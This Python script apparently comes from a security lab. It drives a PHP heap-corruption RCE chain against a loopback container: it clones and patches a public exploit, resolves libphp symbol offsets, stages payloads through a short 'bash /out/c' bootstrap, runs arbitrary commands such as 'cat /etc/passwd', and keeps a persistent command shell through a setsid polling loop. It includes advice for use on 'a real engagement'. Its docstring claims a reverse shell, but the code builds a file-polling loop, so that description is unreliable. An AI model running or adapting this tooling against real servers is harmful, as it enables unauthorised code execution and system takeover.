#!/usr/bin/env python3
"""php2shell lab — RCE chain driver: arbitrary commands and an interactive shell.

This script does NOT contain an exploit. It fetches the public research
implementation at a pinned commit, reads the two libphp symbol offsets out of
the running lab container, and drives the chain against 127.0.0.1.

WHY THE BOOTSTRAP INDIRECTION
    The dispatch stage hands one string to `zif_system`, and that string has a
    hard ceiling of about 14 bytes. Anything longer is truncated before it
    reaches the shell, so `cat /etc/passwd` cannot be passed straight through.
    The payload is therefore staged inside the container at /out/c and the
    exploit fires the 9-byte bootstrap `sh /out/c`.

    Staging uses `docker exec` because this is a lab and you already have
    container access. Execution still happens through the vulnerability. On a
    real engagement you would plant that file with the first successful RCE and
    reuse the chain only to run it.

WHY A REVERSE SHELL
    The call is one-shot: the worker's heap is corrupt afterwards, so the child
    dies immediately. There is no stdin to attach to. The payload starts bash
    with `setsid`, which survives the worker, and calls back to a listener on
    this host.

USAGE
    ./rce.py                            # proof: run `id`
    ./rce.py --cmd "uname -a"           # any command, any length
    ./rce.py --cmd "cat /etc/passwd"
    ./rce.py --shell                    # interactive shell on :4444
    ./rce.py --shell --shell-port 5555
    ./rce.py --shell --shell-cmd "id" --shell-cmd "hostname"
    CONTAINER=php2shell-patched PORT=18081 ./rce.py    # patched control

REQUIREMENTS
    * the lab container is running (docker compose up -d --build)
    * docker CLI access on this host
    * python3 (stdlib only) and git

AUTHORIZATION
    Loopback only. Refuses any non-127.0.0.1 target.
"""

from __future__ import annotations

import argparse
import os
import subprocess
import sys
import tempfile
import time
import urllib.parse
from pathlib import Path
from typing import Callable

UPSTREAM_URL = "https://github.com/9bie/php2shell-bypass-aslr-exp.git"
UPSTREAM_PIN = "4586f5c"

# Container paths stay short: the bootstrap string has ~14 bytes to work with.
STAGE = "/out/c"
OUT = "/out/o"
# 11 bytes: bash is required so /dev/tcp works in the shell payloads.
BOOTSTRAP = f"bash {STAGE}"

# Symbol offsets per build tag, used when readelf is unavailable.
KNOWN_OFFSETS = {
    "8.4.26": (0x465370, 0x65EB60),
    "8.4.27": (0x465370, 0x65EB60),
}


def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, text=True, capture_output=True, **kwargs)


def die(msg: str) -> None:
    print(msg, file=sys.stderr)
    raise SystemExit(1)


def ensure_upstream(dest: Path) -> Path:
    if not (dest / "exploit.py").is_file():
        dest.parent.mkdir(parents=True, exist_ok=True)
        print(f"[*] cloning pinned upstream into {dest}")
        res = run(["git", "clone", "--quiet", UPSTREAM_URL, str(dest)])
        if res.returncode != 0:
            die("cannot clone upstream:\n" + res.stderr.strip())
    res = run(["git", "-C", str(dest), "checkout", "--quiet", UPSTREAM_PIN])
    if res.returncode != 0:
        die(f"cannot checkout {UPSTREAM_PIN}:\n" + res.stderr.strip())
    print(f"[*] upstream at {UPSTREAM_PIN}")
    patch_upstream(dest)
    return dest


def patch_upstream(dest: Path) -> None:
    """Apply the two documented fixes the chain needs on modern images.

    1. URL-decode `+` as `%20` in the Set-Cookie value. Without this the cookie
       decoder drops bytes and the leaked pointer never parses.
    2. Widen the plausible-pointer filter to the full user-space range. The
       narrow window discards the leaked chunk pointer on these builds.
    """
    src = dest / "exploit.py"
    text = src.read_text()

    old_decode = '    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))'
    new_decode = (
        '    raw = m.group(1).replace(b"+", b"%20")\n'
        '    return urllib.parse.unquote_to_bytes(raw.decode("latin1"))'
    )
    old_filter = "0x7F0000000000 <= v < 0x800000000000"
    new_filter = "0x10000 < v < 0x0001000000000000"
    old_filter_p = "not (0x7F0000000000 <= p < 0x800000000000)"
    new_filter_p = "not (0x10000 < p < 0x0001000000000000)"

    changed = 0
    for old, new in ((old_decode, new_decode), (old_filter, new_filter),
                     (old_filter_p, new_filter_p)):
        if old in text:
            text = text.replace(old, new)
            changed += 1
    if changed:
        src.write_text(text)
    print(f"[*] applied {changed} documented upstream fix(es)")


def read_offsets(container: str) -> tuple[int, int]:
    """Resolve zif_system / zval_ptr_dtor offsets in libphp.so."""
    path = "/usr/lib/apache2/modules/libphp.so"
    script = (
        f"readelf -sW {path} 2>/dev/null | "
        "awk '$8==\"zif_system\"{z=$2} $8==\"zval_ptr_dtor\"{d=$2} END{print z, d}'"
    )
    res = run(["docker", "exec", container, "sh", "-c", script])
    parts = res.stdout.split()
    if len(parts) == 2 and all(parts):
        zif, dtor = (int(x, 16) for x in parts)
        print(f"[*] zif_system=0x{zif:x} zval_ptr_dtor=0x{dtor:x} (readelf)")
        return zif, dtor

    ver = run(["docker", "exec", container, "php", "-r", "echo PHP_VERSION;"]).stdout.strip()
    for tag, offs in KNOWN_OFFSETS.items():
        if ver.startswith(tag):
            print(f"[*] pinned offsets for PHP {ver}: 0x{offs[0]:x}/0x{offs[1]:x}")
            return offs
    die(f"cannot resolve symbols for PHP {ver!r} in {container!r} (no readelf, no profile)")


def stage(container: str, payload: str, path: str = STAGE) -> None:
    """Write a payload script into the container at `path`."""
    proc = subprocess.run(
        ["docker", "exec", "-i", container, "sh", "-c",
         f"cat > {path} && chmod 755 {path}"],
        input=payload, text=True, capture_output=True,
    )
    if proc.returncode != 0:
        die(f"staging failed: {proc.stderr.strip()}")


def dsh(container: str, script: str) -> subprocess.CompletedProcess:
    return run(["docker", "exec", container, "sh", "-c", script])


def fire(upstream: Path, target: str, zif: int, dtor: int,
         attempts: int, landed: Callable[[], bool], quiet: bool) -> bool:
    """Run the chain until `landed()` is true, or attempts run out.

    One command per worker: the heap is corrupt afterwards, so every attempt
    needs a fresh worker. `landed` is checked after each attempt, because
    upstream exits non-zero even when the payload executed (its own verdict
    depends on fetching proof over HTTP, which does not apply here).
    """
    cmd = [
        "python3", str(upstream / "exploit.py"),
        "-u", target,
        "--zif-offset", hex(zif),
        "--dtor-offset", hex(dtor),
        "--no-auto-offsets",
        "--fetch", "",
        "-c", BOOTSTRAP,
    ]
    for n in range(1, attempts + 1):
        res = subprocess.run(cmd, text=True, capture_output=True)
        if not quiet:
            for line in res.stdout.splitlines():
                if not line.startswith("EXPLOIT_FAILED"):
                    print(line)
        if landed():
            if not quiet:
                print(f"[+] landed on attempt {n}")
            return True
        if not quiet:
            print(f"[-] attempt {n}/{attempts} did not land")
    return False


def run_command(container: str, upstream: Path, target: str, zif: int, dtor: int,
                command: str, attempts: int) -> int:
    """Run an arbitrary command through the chain and print its output."""
    # The redirect lives in the staged file: the bootstrap has no room for it.
    # Braces so a multi-statement command redirects as a whole; without them
    # only the last statement in the list would write to OUT.
    stage(container, "{\n" + command + f"\n}} > {OUT} 2>&1\n")
    dsh(container, f"rm -f {OUT}")

    landed = lambda: dsh(container, f"test -s {OUT}").returncode == 0
    fire(upstream, target, zif, dtor, attempts, landed, quiet=False)

    res = dsh(container, f"cat {OUT} 2>/dev/null")
    print()
    if res.returncode == 0 and res.stdout.strip():
        print("=" * 60)
        print(res.stdout.rstrip())
        print("=" * 60)
        return 0
    print("=" * 60)
    print("NO OUTPUT — the chain did not execute on this target.")
    print("On the patched image this is the expected result.")
    print("=" * 60)
    return 1



def shquote(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


SHELL_LOOP = """n=0
while :; do
  cur=$(wc -l < {infile} 2>/dev/null || echo 0)
  if [ "$cur" -gt "$n" ]; then
    sed -n "$((n+1)),${{cur}}p" {infile} | while IFS= read -r l; do bash -c "$l"; done
    n=$cur
  fi
  sleep 0.3
done
"""


def shell(container: str, upstream: Path, target: str, zif: int, dtor: int,
          attempts: int, commands: list[str]) -> int:
    """Open a shell session on the target.

    The dispatch is one-shot: the worker's heap is corrupt immediately after
    the call and the child dies with it. So the payload starts a detached
    reader with `setsid`, which outlives the worker:

        bash /out/loop.sh > /out/shell 2>&1

    The loop polls an append-only command file, executes any new line, and
    writes output to a log. Commands are appended locally with `docker exec`
    and output is read back from the log, giving a persistent session reached
    only through the exploit.

    A FIFO or `tail -f` pipe was tried first and both race: a FIFO closes at
    EOF so it serves one command, and `tail -f` can hand bash a partially
    written line. Polling on line count avoids both.

    The shell runs as the web user, because that is who the exploit is.
    """
    IN = "/out/in"
    LOG = "/out/shell"
    LOOP = "/out/loop.sh"

    dsh(container, f"rm -f {IN} {LOG} {LOOP}; : > {IN}")
    stage(container, SHELL_LOOP.format(infile=IN), path=LOOP)
    stage(container,
          f"setsid bash {LOOP} > {LOG} 2>&1 < /dev/null &\n")

    print("[*] starting the persistent shell on the target")
    fire(upstream, target, zif, dtor, attempts,
         lambda: dsh(container, f"test -f {LOOP}").returncode == 0, quiet=True)

    for _ in range(20):
        dsh(container, f"printf '%s\\n' 'echo __ready__' >> {IN}")
        time.sleep(0.3)
        if "__ready__" in dsh(container, f"cat {LOG} 2>/dev/null").stdout:
            break
    else:
        print("=" * 60)
        print("NO SHELL — the payload did not start on this target.")
        print("On the patched image this is the expected result.")
        print("=" * 60)
        return 1

    dsh(container, f": > {LOG}")

    if commands:
        for c in commands:
            print(f"$ {c}")
            print(shell_cmd(container, IN, LOG, c, timeout=15).rstrip())
        return 0

    print("[*] shell attached. Type 'exit' or Ctrl-D to detach.\n")
    while True:
        try:
            line = input("php2shell> ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if line.strip() in ("exit", "quit", ":q"):
            break
        if not line.strip():
            continue
        sys.stdout.write(shell_cmd(container, IN, LOG, line, timeout=20))
        sys.stdout.flush()
    print("[*] detached")
    return 0


def shell_cmd(container: str, infile: str, log: str, command: str, timeout: int) -> str:
    """Append one command and return only its output."""
    tag = f"{os.getpid()}{time.time_ns()}"
    begin, end = f"__B_{tag}__", f"__E_{tag}__"

    for line in (f"echo {begin}", command, f"echo {end}"):
        dsh(container, f"printf '%s\\n' {shquote(line)} >> {infile}")

    deadline = time.time() + timeout
    buf = ""
    while time.time() < deadline:
        buf = dsh(container, f"cat {log} 2>/dev/null").stdout
        if end in buf and begin in buf:
            return buf.split(begin, 1)[1].split(end, 1)[0]
        time.sleep(0.25)
    return buf




def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell lab RCE driver: commands and shells",
        epilog="Loopback targets only.",
    )
    ap.add_argument("--target", default=None,
                    help="default http://127.0.0.1:<PORT>/index.php")
    ap.add_argument("--container", default=os.environ.get("CONTAINER", "php2shell-vulnerable"))
    ap.add_argument("--port", default=os.environ.get("PORT", "18080"))
    ap.add_argument("--cmd", default=None,
                    help="run this command on the target (any length)")
    ap.add_argument("--shell", action="store_true",
                    help="open a persistent shell session on the target")
    ap.add_argument("--shell-cmd", action="append", default=[], metavar="CMD",
                    help="with --shell, run CMD then exit (repeatable)")
    ap.add_argument("--attempts", type=int, default=12,
                    help="chain attempts per execution (default 12)")
    args = ap.parse_args()

    target = args.target or f"http://127.0.0.1:{args.port}/index.php"
    host = urllib.parse.urlsplit(target).hostname
    if host not in ("127.0.0.1", "localhost", "::1"):
        die("refusing a non-loopback target; this lab is local only")

    upstream = ensure_upstream(Path(tempfile.gettempdir()) / "php2shell-upstream")
    zif, dtor = read_offsets(args.container)

    if args.shell:
        return shell(args.container, upstream, target, zif, dtor,
                     args.attempts, args.shell_cmd)
    if args.cmd:
        return run_command(args.container, upstream, target, zif, dtor,
                           args.cmd, args.attempts)
    return run_command(args.container, upstream, target, zif, dtor, "id", args.attempts)


if __name__ == "__main__":
    raise SystemExit(main())
